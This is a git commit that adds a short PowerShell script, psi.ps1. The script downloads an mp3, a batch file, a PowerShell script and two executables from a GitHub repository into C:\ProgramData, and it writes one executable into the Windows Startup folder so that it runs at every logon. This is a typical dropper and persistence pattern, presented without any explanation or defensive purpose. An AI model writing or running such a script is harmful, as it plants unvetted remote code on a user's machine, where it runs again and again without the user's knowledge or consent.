588c9f3754c6b5e4116b0b415a6cc16a98203974
Da Femboy <77080347+TugaChan@users.noreply.github.com>
2023-02-14 11:22:06 +0000

    Add files via upload

---
+++ psi.ps1
@@ -0,0 +1,5 @@
+cd "C:\ProgramData"; Invoke-WebRequest -Uri "https://github.com/TugaChan/lolzrez/raw/main/moan.mp3" -OutFile "moan.mp3"; Invoke-WebRequest -Uri "https://github.com/TugaChan/lolzrez/raw/main/four.bat" -OutFile "four.bat";
+Invoke-WebRequest -Uri "https://github.com/TugaChan/lolzrez/raw/main/three.exe" -OutFile "three.exe"; Invoke-WebRequest -Uri "https://github.com/TugaChan/lolzrez/raw/main/two.ps1" -OutFile "two.ps1"; Invoke-WebRequest -Uri "https://github.com/TugaChan/lolzrez/raw/main/one.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\one.exe";
+
+
+
